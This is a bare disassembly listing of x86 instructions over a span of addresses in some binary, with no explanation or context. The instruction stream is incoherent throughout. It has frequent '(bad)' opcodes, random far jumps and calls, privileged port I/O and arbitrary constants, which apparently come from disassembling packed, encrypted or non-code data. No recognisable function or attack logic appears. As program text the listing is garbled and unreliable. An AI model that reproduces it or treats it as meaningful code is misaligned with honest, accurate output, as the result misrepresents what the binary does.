  41efc6:	add    DWORD PTR [edi-0x9eea3d1],ebx
  41efcc:	jl     0x41efe8
  41efce:	sub    dh,BYTE PTR [ebx]
  41efd0:	or     eax,0xab67872a
  41efd5:	lods   eax,DWORD PTR es:[esi]
  41efd7:	mov    dl,0x4c
  41efd9:	jno    0x41ef9a
  41efdb:	mov    ch,BYTE PTR [edx]
  41efdd:	inc    edi
  41efde:	or     DWORD PTR [ecx],ecx
  41efe0:	jg     0x41efc9
  41efe2:	retf   0x6055
  41efe5:	nop
  41efe6:	js     0x41f01d
  41efe8:	cwde   
  41efe9:	sbb    DWORD PTR [eax-0x55ed6e96],ecx
  41efef:	in     eax,0xb9
  41eff1:	nop
  41eff2:	or     ebx,DWORD PTR [esi+eiz*8-0x50]
  41eff6:	(bad)  
  41eff7:	adc    bh,BYTE PTR [eax]
  41eff9:	pop    esi
  41effa:	jge    0x41efa0
  41effc:	test   al,0xf0
  41effe:	xor    al,0xbe
  41f000:	rcl    BYTE PTR [esi-0x47aab7d7],0x87
  41f007:	jb     0x41efb7
  41f009:	adc    ah,ah
  41f00b:	test   edi,0x681e985c
  41f011:	sub    DWORD PTR [edx],esp
  41f013:	(bad)  
  41f014:	ins    DWORD PTR es:[edi],dx
  41f015:	popf   
  41f016:	retf   
  41f017:	cdq    
  41f018:	fisubr DWORD PTR [ecx+0x2011b918]
  41f01e:	mov    DWORD PTR [edx+0x39ebc18e],ebp
  41f024:	inc    ecx
  41f025:	imul   ecx,DWORD PTR [ecx+0x60],0x492db23d
  41f02c:	lds    ebp,FWORD PTR [esi+0x10d73d70]
  41f032:	outs   dx,BYTE PTR ds:[esi]
  41f033:	xchg   BYTE PTR [ecx-0x70725800],cl
  41f039:	jmp    0x6bbd:0x74aee4a6
  41f040:	mov    ch,0x75
  41f042:	js     0x41f034
  41f044:	sbb    ebp,DWORD PTR [ebx]
  41f046:	add    edi,DWORD PTR [edx-0x616f7561]
  41f04c:	fcom   QWORD PTR [eax+0x2d]
  41f04f:	jnp    0x41f0bc
  41f051:	rol    BYTE PTR [edi+0x4e],0x5
  41f055:	sbb    BYTE PTR [ebx-0x22],dh
  41f058:	jg     0x41eff1
  41f05a:	inc    ebp
  41f05b:	cmp    DWORD PTR [ebx],esi
  41f05d:	in     eax,dx
  41f05e:	int    0xe0
  41f060:	loopne 0x41eff4
  41f062:	mov    dh,0x1b
  41f064:	xor    al,0xc7
  41f066:	dec    ecx
  41f067:	hlt    
  41f068:	scas   al,BYTE PTR es:[edi]
  41f069:	add    bl,ch
  41f06b:	cdq    
  41f06c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f06e:	xor    BYTE PTR ds:0xbf4523e4,al
  41f074:	mov    ebp,DWORD PTR [eax+eax*4-0x38b0a44f]
  41f07b:	adc    ecx,DWORD PTR [esi]
  41f07d:	and    DWORD PTR [eax-0x39938d82],esp
  41f083:	pop    es
  41f084:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f085:	sbb    BYTE PTR [ebx],dh
  41f087:	and    al,0x18
  41f089:	out    0x48,eax
  41f08b:	pop    ebp
  41f08c:	inc    edx
  41f08d:	adc    esp,DWORD PTR [ebx-0x47]
  41f090:	das    
  41f091:	outs   dx,DWORD PTR ds:[esi]
  41f092:	pop    es
  41f093:	mov    eax,0xd3a10d76
  41f098:	xor    ebp,ecx
  41f09a:	jae    0x41f096
  41f09c:	jbe    0x41f0d3
  41f09e:	and    DWORD PTR [ecx-0x110a0a75],eax
  41f0a4:	cli    
  41f0a5:	and    bl,BYTE PTR [esi+0x41]
  41f0a8:	out    dx,al
  41f0a9:	sub    dl,BYTE PTR [esi-0x5b530ac9]
  41f0af:	mov    edi,0xbc698430
  41f0b4:	xchg   edi,eax
  41f0b5:	inc    eax
  41f0b6:	mov    dl,0x25
  41f0b8:	bound  edx,QWORD PTR [ebx+0x41]
  41f0bb:	dec    DWORD PTR [esi]
  41f0bd:	sub    ah,BYTE PTR [edi]
  41f0bf:	dec    ecx
  41f0c0:	dec    esp
  41f0c1:	pushf  
  41f0c2:	mov    dl,0xa9
  41f0c4:	bound  ebx,QWORD PTR [ebp-0x5]
  41f0c7:	iret   
  41f0c8:	ret    0x1f57
  41f0cb:	sbb    eax,0xa4c59e88
  41f0d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0d1:	daa    
  41f0d2:	push   edx
  41f0d3:	ins    DWORD PTR es:[edi],dx
  41f0d4:	mov    ch,0x26
  41f0d6:	jns    0x41f06a
  41f0d8:	pop    edx
  41f0d9:	adc    esi,DWORD PTR [ebx+ecx*2-0x75f0f0c]
  41f0e0:	(bad)  
  41f0e1:	cs aas 
  41f0e3:	fcom   QWORD PTR [ebx+0x1c]
  41f0e6:	push   esi
  41f0e7:	mov    ebx,edi
  41f0e9:	mov    ch,0x42
  41f0eb:	push   ebp
  41f0ec:	dec    edx
  41f0ed:	imul   esi,DWORD PTR [esi+0x13929e8a],0xffffffbf
  41f0f4:	inc    esi
  41f0f5:	push   eax
  41f0f6:	leave  
  41f0f7:	pop    ecx
  41f0f8:	jbe    0x41f07f
  41f0fa:	push   edi
  41f0fb:	push   0x43
  41f0fd:	or     DWORD PTR [eax+0x5d],esp
  41f100:	je     0x5daab785
  41f106:	cmc    
  41f107:	mov    ebp,0x8c311cc
  41f10c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f10d:	loopne 0x41f0a5
  41f10f:	js     0x41f0db
  41f111:	or     ebx,eax
  41f113:	sub    ch,al
  41f115:	out    dx,al
  41f116:	xchg   esi,eax
  41f117:	mov    eax,0x47f35e45
  41f11c:	sub    al,0xcd
  41f11e:	das    
  41f11f:	jp     0x41f13f
  41f121:	pop    DWORD PTR [ecx]
  41f123:	lea    esi,[ebp+0x4a50b783]
  41f129:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f12a:	sbb    dl,BYTE PTR [edi]
  41f12c:	bound  edi,QWORD PTR ds:0xdcd80c93
  41f132:	xchg   ebx,eax
  41f133:	push   ebx
  41f134:	and    ah,0x46
  41f137:	fnstsw WORD PTR [eax+0x2cf1c3d2]
  41f13d:	cs push edx
  41f13f:	mov    ecx,0x6b5a5cf8
  41f144:	retf   0xda91
  41f147:	std    
  41f148:	xlat   BYTE PTR ds:[ebx]
  41f149:	std    
  41f14a:	stc    
  41f14b:	jecxz  0x41f1c3
  41f14d:	mov    bl,BYTE PTR [edi+0xa]
  41f150:	lods   al,BYTE PTR ds:[esi]
  41f151:	push   ss
  41f152:	neg    DWORD PTR [ebp+0x70]
  41f155:	mov    ah,0x58
  41f157:	or     al,0xa9
  41f159:	push   ebp
  41f15a:	test   al,0xe3
  41f15c:	bswap  eax
  41f15e:	xchg   DWORD PTR [eax-0x53],esi
  41f161:	dec    ecx
  41f162:	push   ebx
  41f163:	punpckhwd mm6,QWORD PTR [edi]
  41f166:	dec    ecx
  41f167:	inc    edi
  41f168:	(bad)  
  41f169:	clc    
  41f16a:	cli    
  41f16b:	cwde   
  41f16c:	xor    esp,edi
  41f16e:	xchg   esp,eax
  41f16f:	pop    ds
  41f170:	daa    
  41f171:	retf   0xcfb4
  41f174:	push   ds
  41f175:	sub    BYTE PTR [esi+ebp*2+0x9],ah
  41f179:	js     0x41f1eb
  41f17b:	lods   al,BYTE PTR ds:[esi]
  41f17c:	call   0x622a:0x1c6b3d48
  41f183:	or     eax,0x5cc8c8aa
  41f188:	pop    edi
  41f189:	mov    dl,0x48
  41f18b:	jecxz  0x41f17d
  41f18d:	test   eax,0x62fcf8e2
  41f192:	lahf   
  41f193:	popf   
  41f194:	bound  eax,QWORD PTR [ebp-0xb]
  41f197:	jmpw   0x4292
  41f19b:	imul   esi,DWORD PTR [ebp-0x76],0x75
  41f19f:	daa    
  41f1a0:	mov    ds:0xce03444f,al
  41f1a5:	cld    
  41f1a6:	sar    ebp,1
  41f1a8:	and    eax,0x2ef602b5
  41f1ad:	jns    0x41f221
  41f1af:	pop    edi
  41f1b0:	mov    eax,ds:0x7b39b570
  41f1b5:	xor    al,0xcf
  41f1b7:	mov    DWORD PTR [ecx+0x7184ca6a],ecx
  41f1bd:	xlat   BYTE PTR ds:[ebx]
  41f1be:	jmp    0xfa5a:0x8745c670
  41f1c5:	inc    edi
  41f1c6:	inc    ebp
  41f1c7:	jne    0x41f149
  41f1c9:	add    DWORD PTR [eax+0x5e],ebx
  41f1cc:	xchg   esp,eax
  41f1cd:	call   0xe9d:0x19797fbc
  41f1d4:	mov    ebx,0xc2616e92
  41f1d9:	and    eax,0x9304efe3
  41f1de:	xchg   esi,eax
  41f1df:	jo     0x41f167
  41f1e1:	call   0x49d2:0x5b6e6075
  41f1e8:	pop    eax
  41f1e9:	inc    eax
  41f1ea:	test   eax,0x3d6cb33c
  41f1ef:	and    al,0x53
  41f1f1:	fisub  WORD PTR [esi-0x5b]
  41f1f4:	retf   
  41f1f5:	out    0x68,al
  41f1f7:	in     eax,dx
  41f1f8:	retf   0x916f
  41f1fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1fc:	lahf   
  41f1fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1fe:	mov    bl,0xf7
  41f200:	rol    DWORD PTR [edx+0x6ce79691],cl
  41f206:	add    ah,BYTE PTR [edi+0x37]
  41f209:	(bad)
  41f20c:	pop    esp
  41f20d:	fild   WORD PTR [edi+0x3]
  41f210:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f211:	push   eax
  41f212:	(bad)  
  41f213:	lods   al,BYTE PTR ds:[esi]
  41f214:	xor    ebp,eax
  41f216:	test   DWORD PTR [ecx-0x3b6332d6],esp
  41f21c:	outs   dx,BYTE PTR ds:[esi]
  41f21d:	lods   al,BYTE PTR ds:[esi]
  41f21e:	mov    al,ds:0xb9b9886f
  41f223:	xchg   edx,eax
  41f224:	cli    
  41f225:	rcr    BYTE PTR [edx],cl
  41f227:	cli    
  41f228:	out    0x3b,eax
  41f22a:	push   edx
  41f22b:	xor    BYTE PTR [ebx+0x7a2025d0],0xb1
  41f232:	and    al,0x28
  41f234:	(bad)  
  41f235:	jno    0x41f1f1
  41f237:	(bad)  
  41f238:	(bad)  
  41f239:	aas    
  41f23a:	pop    edx
  41f23b:	mov    dl,0xe9
  41f23d:	pop    ebp
  41f23e:	push   ebx
  41f23f:	inc    ecx
  41f240:	mov    bh,0xf5
  41f242:	aaa    
  41f243:	call   0x1fdc:0x473c24b7
  41f24a:	adc    eax,0x111370b5
  41f24f:	(bad)  
  41f250:	(bad)  
  41f251:	jp     0x41f266
  41f253:	adc    al,0x26
  41f255:	mov    al,ds:0x91e7191
  41f25a:	add    bh,BYTE PTR [ebx+0x5f]
  41f25d:	push   cs
  41f25e:	dec    esi
  41f25f:	shl    BYTE PTR [edx-0x80],1
  41f262:	ins    BYTE PTR es:[edi],dx
  41f263:	sub    edx,eax
  41f265:	adc    ebp,edi
  41f267:	mov    ecx,0x902ac6d2
  41f26c:	out    0x16,eax
  41f26e:	add    al,0xcb
  41f270:	mov    BYTE PTR [edi-0x67a71694],ch
  41f276:	jo     0x41f2d3
  41f278:	jo     0x41f200
  41f27a:	ins    DWORD PTR es:[edi],dx
  41f27b:	add    bl,BYTE PTR [ecx+0x490346cc]
  41f281:	mov    ebx,ebx
  41f283:	inc    edi
  41f284:	sbb    DWORD PTR [edi+ecx*2],ebx
  41f287:	nop
  41f288:	jbe    0x41f241
  41f28a:	inc    edx
  41f28b:	mov    edx,0x1a514ec6
  41f290:	retf   0x5ad7
  41f293:	pop    es
  41f294:	push   ds
  41f295:	cmp    dl,ch
  41f297:	dec    eax
  41f298:	pop    edi
  41f299:	(bad)  
  41f29a:	int3   
  41f29b:	aam    0xd8
  41f29d:	push   ecx
  41f29e:	dec    ebx
  41f29f:	add    BYTE PTR [esi+0x3bc5bd69],bl
  41f2a5:	leave  
  41f2a6:	mov    cl,0x78
  41f2a8:	fldpi  
  41f2aa:	jcxz   0x41f2a4
  41f2ad:	add    al,0x7
  41f2af:	retf   0xb6b5
  41f2b2:	pop    ss
  41f2b3:	mov    eax,ds:0xc0e8ef4b
  41f2b8:	loope  0x41f2b4
  41f2ba:	jg     0x41f28d
  41f2bc:	stos   DWORD PTR es:[edi],eax
  41f2bd:	and    ch,bl
  41f2bf:	or     DWORD PTR [esi+0x43],esi
  41f2c2:	push   ebx
  41f2c3:	push   0x29771427
  41f2c8:	mov    DWORD PTR [esi+0x0],edx
  41f2cb:	ins    BYTE PTR es:[edi],dx
  41f2cc:	ror    DWORD PTR [ebp+ebx*4-0x12],0x1d
  41f2d1:	(bad)  
  41f2d2:	inc    ebx
  41f2d3:	pushf  
  41f2d4:	mov    edx,0x44d88528
  41f2d9:	(bad)  
  41f2da:	out    dx,al
  41f2db:	mov    ebx,0xe8c20fce
  41f2e0:	or     eax,0x1b3c43e4
  41f2e5:	mov    esp,0xc93b966e
  41f2ea:	pop    eax
  41f2eb:	mov    cl,0x70
  41f2ed:	mov    dh,cl
  41f2ef:	mov    ?,WORD PTR [edi+0x3c]
  41f2f2:	jp     0x41f349
  41f2f4:	mov    ebp,0xc4f1d472
  41f2f9:	jle    0x41f2aa
  41f2fb:	jne    0x41f28a
  41f2fd:	call   0x40b26a61
  41f302:	add    al,0xbb
  41f304:	sbb    al,0x14
  41f306:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f307:	(bad)  
  41f308:	call   0x8b8c46b8
  41f30d:	pop    ebx
  41f30e:	jl     0x41f2d4
  41f310:	xlat   BYTE PTR ds:[ebx]
  41f311:	xchg   ecx,eax
  41f312:	push   ebx
  41f313:	imul   esp,DWORD PTR [edi],0x89d9439a
  41f319:	sbb    al,0xba
  41f31b:	jbe    0x41f2e0
  41f31d:	xor    eax,0x4965a06a
  41f322:	leave  
  41f323:	repz leave 
  41f325:	ror    DWORD PTR [eax+0x412da47b],1
  41f32b:	xor    edx,DWORD PTR [edi-0x69e9a6da]
  41f331:	mov    ch,0x57
  41f333:	ror    DWORD PTR [ebx+edi*1+0x5],cl
  41f337:	call   0x724f:0x223750e7
  41f33e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f33f:	icebp  
  41f340:	push   ebx
  41f341:	jns    0x41f37f
  41f343:	scas   eax,DWORD PTR es:[edi]
  41f344:	cmp    BYTE PTR [edx-0x5f640316],ah
  41f34a:	retf   
  41f34b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f34c:	ins    DWORD PTR es:[edi],dx
  41f34d:	and    ebp,DWORD PTR [ebp-0x46400713]
  41f353:	and    al,0x4b
  41f355:	daa    
  41f356:	out    dx,al
  41f357:	sbb    DWORD PTR [eax+ecx*8+0x6e36e500],edx
  41f35e:	jecxz  0x41f340
  41f360:	mov    dh,0xd
  41f362:	push   cs
  41f363:	sub    eax,0x3ae4aeb
  41f368:	fs add eax,eax
  41f36b:	adc    bh,BYTE PTR [edi]
  41f36d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f36e:	inc    edx
  41f36f:	cs or  ah,al
  41f372:	mov    dl,BYTE PTR [ecx-0x237c1af6]
  41f378:	les    esi,FWORD PTR [ebx-0x54]
  41f37b:	inc    edx
  41f37c:	jb     0x41f3ae
  41f37e:	nop
  41f37f:	cmp    eax,DWORD PTR [edx+ebp*8-0x2b]
  41f383:	xchg   esp,eax
  41f384:	sub    eax,0xecd0f698
  41f389:	pop    eax
  41f38a:	aam    0xdb
  41f38c:	(bad)  
  41f38d:	xor    al,0x88
  41f38f:	or     cl,BYTE PTR [ebx-0x5b6372dc]
  41f395:	outs   dx,BYTE PTR ds:[esi]
  41f396:	add    ah,BYTE PTR [eax]
  41f398:	xchg   ebx,eax
  41f399:	jb     0x41f3fe
  41f39b:	cmp    DWORD PTR [ecx],edx
  41f39d:	xor    al,0x22
  41f39f:	outs   dx,BYTE PTR ds:[esi]
  41f3a0:	je     0x41f356
  41f3a2:	ret    
  41f3a3:	push   edi
  41f3a4:	in     eax,0x1
  41f3a6:	ficom  WORD PTR [ecx+0x40]
  41f3a9:	add    ah,BYTE PTR [edi+0x6f]
  41f3ac:	inc    ebx
  41f3ad:	daa    
  41f3ae:	jbe    0x41f416
  41f3b0:	cs std 
  41f3b2:	pushf  
  41f3b3:	xchg   esp,eax
  41f3b4:	cdq    
  41f3b5:	cmp    bl,BYTE PTR ds:[ebx]
  41f3b8:	pop    edx
  41f3b9:	mov    eax,ds:0x7067507
  41f3be:	mov    edx,DWORD PTR [ecx+0x471fe0c8]
  41f3c4:	sahf   
  41f3c5:	jne    0x41f3fb
  41f3c7:	rol    BYTE PTR [ebx],cl
  41f3c9:	and    DWORD PTR [edi],0x7d
  41f3cc:	lahf   
  41f3cd:	or     ah,dl
  41f3cf:	repz rcl BYTE PTR [ebx+0x66101df5],1
  41f3d6:	xchg   esi,eax
  41f3d7:	stos   BYTE PTR es:[edi],al
  41f3d8:	inc    edx
  41f3d9:	into   
  41f3da:	cmp    BYTE PTR [edi+0x74],al
  41f3dd:	xchg   ebx,eax
  41f3de:	add    ah,BYTE PTR [ebx]
  41f3e0:	call   0x3425:0xd1bbe5fd
  41f3e7:	data16 mov dl,0xc
  41f3ea:	test   eax,0x7d6cd792
  41f3ef:	or     DWORD PTR [ebx],edx
  41f3f1:	dec    edi
  41f3f2:	push   esi
  41f3f3:	xchg   edi,eax
  41f3f4:	jbe    0x41f44f
  41f3f6:	xor    DWORD PTR [ebp-0x4c],esi
  41f3f9:	(bad)  
  41f3fa:	in     eax,0x9d
  41f3fc:	stos   BYTE PTR es:[edi],al
  41f3fd:	ficom  DWORD PTR [ecx]
  41f3ff:	adc    BYTE PTR [eax+0x2fd9bd98],ch
  41f405:	dec    ecx
  41f406:	repz pop ebp
  41f408:	mov    edx,0xe43ff93
  41f40d:	mov    ebp,0x2440cbec
  41f412:	aaa    
  41f413:	sbb    BYTE PTR [edi+0x1d671609],dl
  41f419:	(bad)  
  41f41a:	jmp    0x2ba4:0xd2b5526e
  41f421:	scas   al,BYTE PTR es:[edi]
  41f422:	cmp    BYTE PTR [ebx+ecx*1-0x7a2818df],ah
  41f429:	and    BYTE PTR [edx-0x3f],dh
  41f42c:	push   edx
  41f42d:	call   0x8516:0x9e628c3
  41f434:	pop    esi
  41f435:	fwait
  41f436:	pop    ecx
  41f437:	retf   
  41f438:	xchg   DWORD PTR [edi-0x5e],ebx
  41f43b:	outs   dx,BYTE PTR ds:[esi]
  41f43c:	test   al,0xe
  41f43e:	int3   
  41f43f:	dec    eax
  41f440:	jp     0x41f442
	...
  41f44a:	push   edx
  41f44b:	dec    ebp
  41f44c:	dec    esp
  41f44d:	inc    ebp
  41f44e:	pop    edi
  41f44f:	inc    ebp
  41f450:	pop    ebx
  41f451:	pop    edi
  41f452:	shr    BYTE PTR [esi+0x27],0x49
  41f456:	xchg   edi,eax
  41f457:	stos   BYTE PTR es:[edi],al
  41f458:	xor    esp,DWORD PTR [ebx]
  41f45a:	iret   
  41f45b:	add    DWORD PTR [ecx],0x0
  41f45e:	jg     0x41f466
  41f460:	add    BYTE PTR [eax],al
  41f462:	imul   ebp,DWORD PTR [ecx+0x4acd92ab],0x1
  41f469:	xor    BYTE PTR [edi+0xb],dh
  41f46c:	sbb    di,sp
  41f46f:	not    edi
  41f471:	daa    
  41f472:	stos   DWORD PTR es:[edi],eax
  41f473:	mov    eax,0x5619506a
  41f478:	mov    ah,BYTE PTR [edi+0x76]
  41f47b:	stc    
  41f47c:	pop    ecx
  41f47d:	out    dx,al
  41f47e:	retf   
  41f47f:	adc    DWORD PTR [edi],eax
  41f481:	mov    al,0x3f
  41f483:	add    BYTE PTR [eax+0x1],dl
  41f486:	lds    esi,FWORD PTR [ecx+0x73]
  41f489:	js     0x41f4a0
  41f48b:	adc    ecx,DWORD PTR [edi-0x57728a64]
  41f491:	cmc    
  41f492:	test   BYTE PTR [esi+0x153c7d88],bl
  41f498:	enter  0xe52f,0xc7
  41f49c:	ins    BYTE PTR es:[edi],dx
  41f49d:	outs   dx,WORD PTR ds:[esi]
  41f49f:	cmp    ecx,esp
  41f4a1:	cs jne 0x41f491
  41f4a4:	leave  
  41f4a5:	add    DWORD PTR [eax+0x1],edx
  41f4a8:	mov    ebp,DWORD PTR [ebx+eiz*8-0x1544a244]
  41f4af:	adc    eax,0xf3f51382
  41f4b4:	dec    edx
  41f4b5:	mov    eax,ebp
  41f4b7:	push   eax
  41f4b8:	sar    edx,0x30
  41f4bb:	nop
  41f4bc:	xor    esi,DWORD PTR [ecx-0x73]
  41f4bf:	fidiv  WORD PTR [edx]
  41f4c1:	hlt    
  41f4c2:	xchg   ebp,eax
  41f4c3:	pop    eax
  41f4c4:	fldenv [edx]
  41f4c6:	xlat   BYTE PTR ds:[ebx]
  41f4c7:	lods   eax,DWORD PTR ds:[esi]
  41f4c8:	jne    0x41f44c
  41f4ca:	push   0x686b534a
  41f4cf:	and    bl,BYTE PTR [ebp+0x23]
  41f4d2:	sub    ecx,DWORD PTR [eax]
  41f4d4:	sub    bl,BYTE PTR [edx-0x1824a49b]
  41f4da:	fisttp DWORD PTR [ebx]
  41f4dc:	addr16 popf 
  41f4de:	dec    ebx
  41f4df:	pop    ecx
  41f4e0:	addr16 test eax,0x944da5a1
  41f4e6:	jg     0x41f4ce
  41f4e8:	push   0xd1bcf67
  41f4ed:	xor    bl,BYTE PTR [edx+0x6d]
  41f4f0:	adc    BYTE PTR ds:0x906549a7,cl
  41f4f6:	rol    DWORD PTR [ebx+0x4401ceb0],0xf1
  41f4fd:	shl    DWORD PTR [esi-0x21],1
  41f500:	fild   QWORD PTR [ebp+0x53]
  41f503:	out    0x69,al
  41f505:	jae    0x41f545
  41f507:	mov    ah,0xf1
  41f509:	into   
  41f50a:	out    dx,eax
  41f50b:	or     eax,DWORD PTR [edi]
  41f50d:	dec    ebx
  41f50e:	addr16 (bad) 
  41f510:	push   ebx
  41f511:	aas    
  41f512:	in     eax,dx
  41f513:	pop    ebx
  41f514:	jne    0x41f4be
  41f516:	xchg   edi,eax
  41f517:	pushf  
  41f518:	mov    esp,0xd6f76ccb
  41f51d:	lock cwde 
  41f51f:	xchg   ecx,eax
  41f520:	mov    al,0x9
  41f522:	push   0xffffff95
  41f524:	or     eax,0xfc7ce9b4
  41f529:	jno    0x41f56d
  41f52b:	sbb    al,0x81
  41f52d:	pop    esi
  41f52e:	mov    edi,fs
  41f530:	adc    BYTE PTR [esi+0x2f],dh
  41f533:	fnstcw WORD PTR [ecx+esi*2-0x4c3113c7]
  41f53a:	shr    BYTE PTR [ebp-0x7a],0x77
  41f53e:	pop    eax
  41f53f:	xchg   esp,eax
  41f540:	mov    WORD PTR ds:0x98455b90,gs
  41f546:	das    
  41f547:	sub    eax,0xfa333792
  41f54c:	inc    esi
  41f54d:	clc    
  41f54e:	mov    bh,BYTE PTR [ecx-0x63]
  41f551:	lods   al,BYTE PTR ds:[esi]
  41f552:	movzx  edx,dh
  41f555:	cmp    DWORD PTR [ecx+edi*1+0x1b325b83],0x345e8530
  41f560:	sbb    ch,bl
  41f562:	inc    edi
  41f563:	mov    edx,0xac4609cc
  41f568:	not    BYTE PTR [ebx+0x43]
  41f56b:	pop    esi
  41f56c:	and    al,0xe4
  41f56e:	outs   dx,BYTE PTR ds:[esi]
  41f56f:	sbb    eax,0xc93cf387
  41f574:	jo     0x41f570
  41f576:	sti    
  41f577:	jo     0x41f556
  41f579:	out    dx,eax
  41f57a:	int    0x91
  41f57c:	jb     0x41f572
  41f57e:	or     dl,BYTE PTR [edx]
  41f580:	jecxz  0x41f5b3
  41f582:	adc    ah,BYTE PTR [esp+edx*2+0x1f]
  41f586:	gs mov ecx,0x2623e940
  41f58c:	push   esp
  41f58d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f58e:	outs   dx,DWORD PTR ds:[esi]
  41f58f:	rcl    BYTE PTR [eax-0x10f7d3d4],0x5e
  41f596:	std    
  41f597:	ins    BYTE PTR es:[edi],dx
  41f598:	out    dx,al
  41f599:	mov    ah,dh
  41f59b:	test   al,0xda
  41f59d:	into   
  41f59e:	dec    ecx
  41f59f:	and    BYTE PTR [edi-0x583fd657],al
  41f5a5:	lahf   
  41f5a6:	jl     0x41f538
  41f5a8:	xchg   edx,ebx
  41f5aa:	inc    ebp
  41f5ab:	ret    0x883e
  41f5ae:	xor    ebp,eax
  41f5b0:	cmp    al,0x9d
  41f5b2:	sbb    ebx,eax
  41f5b4:	add    edx,eax
  41f5b6:	pop    esi
  41f5b7:	jbe    0x41f61c
  41f5b9:	(bad)  
  41f5ba:	push   0xffffffad
  41f5bc:	popf   
  41f5bd:	cmp    edi,DWORD PTR [ebp+ecx*4-0x2e]
  41f5c1:	sbb    ch,BYTE PTR [ebp+0x68fc46e]
  41f5c7:	sbb    ch,0x1f
  41f5ca:	out    dx,al
  41f5cb:	mov    ah,0x55
  41f5cd:	dec    eax
  41f5ce:	test   eax,0x412e8bf5
  41f5d3:	mov    cl,0xb2
  41f5d5:	nop
  41f5d6:	cwde   
  41f5d7:	or     eax,0xb1d99611
  41f5dc:	push   ebp
  41f5dd:	jnp    0x41f64e
  41f5df:	rol    DWORD PTR [ebx+0x3f48f0d],0x1e
  41f5e6:	nop
  41f5e7:	push   cs
  41f5e8:	arpl   WORD PTR [edi+0x30a07faa],cx
  41f5ee:	fmulp  st(4),st
  41f5f0:	push   0xa16cf588
  41f5f5:	ds sbb eax,0x468081c7
  41f5fb:	test   eax,0x28dc0062
  41f600:	out    0xc,eax
  41f602:	std    
  41f603:	cmc    
  41f604:	adc    al,BYTE PTR [ecx-0x7583115]
  41f60a:	data16 add ah,BYTE PTR [ebp+0x519e0244]
  41f611:	outs   dx,BYTE PTR ds:[esi]
  41f612:	fs pushf 
  41f614:	clc    
  41f615:	xor    DWORD PTR [ebx-0xf],esp
  41f618:	(bad)  
  41f619:	ja     0x41f5d6
  41f61b:	popa   
  41f61c:	jle    0x41f64f
  41f61e:	(bad)
  41f621:	fstp   QWORD PTR [ebx*1+0x462cdb18]
  41f628:	mov    DWORD PTR [ecx+0x39],esi
  41f62b:	in     eax,dx
  41f62c:	inc    ecx
  41f62d:	addr16 jmp 0x41f658
  41f630:	int3   
  41f631:	pop    ds
  41f632:	xor    edx,DWORD PTR [ebx+0x30]
  41f635:	push   ebx
  41f636:	dec    esi
  41f637:	pop    esi
  41f638:	xchg   esp,eax
  41f639:	xchg   ecx,eax
  41f63a:	add    DWORD PTR [ebp+0x403caaa3],esp
  41f640:	ins    DWORD PTR es:[edi],dx
  41f641:	push   ss
  41f642:	cli    
  41f643:	mov    dl,0x87
  41f645:	pop    edx
  41f646:	or     dl,BYTE PTR [esi]
  41f648:	jbe    0x41f66a
  41f64a:	xchg   esi,eax
  41f64b:	push   ecx
  41f64c:	mov    edx,0x79077338
  41f651:	xchg   edi,eax
  41f652:	xchg   ebx,eax
  41f653:	xor    DWORD PTR [esi],edi
  41f655:	popf   
  41f656:	test   DWORD PTR [esi+0x48],esi
  41f659:	mov    ecx,0xc4c3bcb2
  41f65e:	sbb    DWORD PTR [edx-0x6],esi
  41f661:	sub    al,cl
  41f663:	retf   
  41f664:	leave  
  41f665:	mov    ds:0x871f2add,al
  41f66a:	mov    al,0x90
  41f66c:	ins    DWORD PTR es:[edi],dx
  41f66d:	push   eax
  41f66e:	dec    ebp
  41f66f:	fstp   TBYTE PTR [esi]
  41f671:	loope  0x41f672
  41f673:	dec    ebp
  41f674:	int3   
  41f675:	xlat   BYTE PTR ds:[ebx]
  41f676:	popa   
  41f677:	data16 and ah,BYTE PTR [edx+0x5a]
  41f67b:	gs loop 0x41f6cb
  41f67e:	pushf  
  41f67f:	scas   al,BYTE PTR es:[edi]
  41f680:	or     edx,DWORD PTR [ecx]
  41f682:	dec    eax
  41f683:	loopne 0x41f6a5
  41f685:	aad    0xb0
  41f687:	inc    esp
  41f688:	fimul  WORD PTR [eax]
  41f68a:	pop    es
  41f68b:	inc    esi
  41f68c:	movsx  ebx,BYTE PTR [esi+0x66]
  41f690:	mov    eax,0xd3da9fba
  41f695:	je     0x41f64a
  41f697:	jnp    0x41f69a
  41f699:	mov    cs,WORD PTR [eax]
  41f69b:	js     0x41f6ff
  41f69d:	out    dx,al
  41f69e:	and    al,0x70
  41f6a0:	push   ss
  41f6a1:	hlt    
  41f6a2:	retf   
  41f6a3:	and    eax,0xc4f135a6
  41f6a8:	xchg   ebp,eax
  41f6a9:	jo     0x41f6d7
  41f6ab:	inc    ecx
  41f6ac:	shl    edx,cl
  41f6ae:	jns    0x41f6c4
  41f6b0:	stc    
  41f6b1:	inc    al
  41f6b3:	mov    ds,WORD PTR [edi+0x57]
  41f6b6:	jns    0x41f66c
  41f6b8:	arpl   WORD PTR [eax],bx
  41f6ba:	mov    eax,ds:0x22c0d244
  41f6bf:	ins    DWORD PTR es:[edi],dx
  41f6c0:	sti    
  41f6c1:	cli    
  41f6c2:	mul    BYTE PTR [eax-0x3]
  41f6c5:	jge    0x41f692
  41f6c7:	mov    al,0xd5
  41f6c9:	mov    ebp,0x4fc57143
  41f6ce:	xchg   ebx,eax
  41f6cf:	xchg   esi,eax
  41f6d0:	or     al,0x7d
  41f6d3:	test   al,0xfc
  41f6d5:	aad    0x2
  41f6d7:	or     eax,0x4107a702
  41f6dc:	push   ebx
  41f6dd:	jmp    0x36121295
  41f6e2:	nop
  41f6e3:	mov    DWORD PTR [edi],ebp
  41f6e5:	jmp    0x898c:0xfbdad182
  41f6ec:	fild   QWORD PTR [esi]
  41f6ee:	cli    
  41f6ef:	aam    0x98
  41f6f1:	xchg   DWORD PTR ds:0xab61cefb,ebp
